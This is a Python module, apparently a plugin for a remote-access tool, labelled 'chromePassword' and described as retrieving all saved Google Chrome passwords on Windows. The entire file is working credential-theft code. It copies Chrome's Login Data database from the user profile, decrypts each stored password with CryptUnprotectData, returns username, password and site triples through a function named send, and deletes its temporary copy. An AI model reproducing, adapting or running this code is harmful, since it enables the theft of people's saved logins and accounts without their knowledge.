__sys__ = ["Windows"];
__name__ = "chromePassword"
__desc__ = "Retrieve all saved password of Google Chrome"
def send():
    import os, sqlite3, win32crypt, shutil
    sourceFileWithLogin = "%s\Google\Chrome\User Data\Profile 1\Login Data" % os.getenv("localappdata")
    sourceFileWithoutLogin = "%s\Google\Chrome\User Data\Default\Login Data" % os.getenv("localappdata")
    def get(sourceFile):
        targetFile = "%s\TempData_C" % os.getenv("localappdata")
        result = "<Username>:<Password> (Site)\n"
        shutil.copy(sourceFile, targetFile)
        connection = sqlite3.connect(targetFile)
        with connection:
            cursor = connection.cursor()
            vGen = cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins")
            dataValue = vGen.fetchall()
        for originURL, username, password in dataValue:
            passwordDecrypted = win32crypt.CryptUnprotectData(
                password, None, None, None, 0)[1]
            if password:
                result += "%s:%s (%s)\n" % (username, passwordDecrypted, originURL)
        connection.close()
        os.remove(targetFile)
        return result
    if os.path.exists(sourceFileWithoutLogin) and \
        len(open(sourceFileWithoutLogin).readlines()) == 0 and \
        os.path.exists(sourceFileWithLogin):
        return get(sourceFileWithLogin)
    else:
        if os.path.exists(sourceFileWithoutLogin) and \
            not len(open(sourceFileWithoutLogin).readlines()) == 0:
            return get(sourceFileWithoutLogin)
        else:
            pass
